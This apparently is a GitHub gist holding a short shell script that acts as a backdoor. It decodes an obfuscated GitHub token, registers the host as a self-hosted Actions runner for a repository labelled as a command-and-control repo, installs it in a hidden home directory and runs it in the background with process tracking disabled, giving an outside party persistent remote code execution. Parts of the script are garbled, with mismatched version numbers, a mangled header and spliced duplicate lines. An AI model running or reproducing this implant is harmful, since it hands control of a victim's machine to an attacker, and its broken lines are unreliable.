#date: 2024-04-24T17:07:49Z
#url: https://api.github.com/gists/053fcc70f8b2f4d44f996d5d74572b4d
#owner: https://api.github.com/users/chai-hulud

SH_REG_PAT=`echo "Z2hwXzBsaGRXN2dMSmphMWxNSUNad2taUnRDa2paa1ZkbDJQZHhEag==" | base64 -d`
C2_REPO=chai-hulud/roadrunner
INSTALL_DIR=$HOME

REG_TOKEN=`curl -L -X POST -H "Accept: "**********": Bearer $SH_REG_PAT" -H "X-GitHub-Api-Version: 2022-11-28" https://api.github.com/repos/$C2_REPO/actions/runners/registration-token | grep token | awk -F\" {'print $4'}`

mkdir $INSTALL_DIR/.actions-runner1/ && cd $INSTALL_DIR/.actions-runner1/
curl -o actions-runner-linux-x64-2.309.0.tar.gz -L https://github.com/actions/runner/releases/download/v2.315.0/actions-runner-linux-x64-2.315.0.tar.gz
tar xzf ./actions-runner-linux-x64-2.309.0.tar.gz
./config.sh --url https: "**********"
rm actions-runner-linux-x64-2.309.0.tar.gz
export RUNNER_TRACKING_ID=0 && nohup ./run.sh &_NAME}" --labels `uname -n`
rm actions-runner-linux-x64-2.309.0.tar.gz
export RUNNER_TRACKING_ID=0 && nohup ./run.sh &